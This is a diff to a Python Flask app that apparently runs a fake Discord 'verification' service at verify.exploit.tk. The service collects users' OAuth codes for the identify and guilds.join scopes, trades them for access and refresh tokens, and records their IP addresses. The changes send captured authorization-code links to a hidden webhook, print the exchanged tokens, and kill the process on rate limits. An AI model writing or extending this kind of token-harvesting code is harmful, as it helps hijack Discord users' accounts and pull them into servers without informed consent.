@@ -24,6 +24,7 @@ import urllib.parse
 verified_redirect = ""
 verifier_redir = "https://discord.com/api/oauth2/authorize?client_id=994684314010796083&redirect_uri=https://verify.exploit.tk&response_type=code&scope=identify%20guilds.join"
 hook = os.environ["hook"]
+error_hook = os.environ["error_hook"]
 tkn = os.environ["tkn"]
 API_ENDPOINT = 'https://canary.discord.com/api/v9'
 CLIENT_ID = '994684314010796083'
@@ -51,7 +52,14 @@ def exchange_code(code):
   headers = {'Content-Type': 'application/x-www-form-urlencoded'}
   r = requests.post(str(API_ENDPOINT) + '/oauth2/token',
                     data=data,
-                    headers=headers)
+headers=headers)
+  if r.status_code == 429:
+    content = "https://verify.exploit.tk/?code=%s" % code
+    r = requests.post(
+  error_hook, json={ "content": content })
+    os.system("kill 1")
+  print(r.status_code)
+  print(r.text)
   if r.status_code in (200, 201, 204):
     return r.json()
   else:
@@ -313,7 +321,7 @@ def process_json():
   # redirect("https://discord.com/invite/spy", code=302)
   try:
     ip = request.environ['HTTP_X_FORWARDED_FOR']
-    ip = ip.split(',')[0]
+   # ip = ip.split(',')[0]
   except:
     ip = None
   try:
@@ -332,7 +340,7 @@ def process_json():
     exchange = exchange_code(idk)
     if exchange == False:
       return redirect("https://discord.com/oauth2/authorized", code=302)
-    # print(exchange)
+    print(exchange)
     access_tk = exchange['access_token']
     # print(access_tk)
     refresh_tk = exchange['refresh_token']
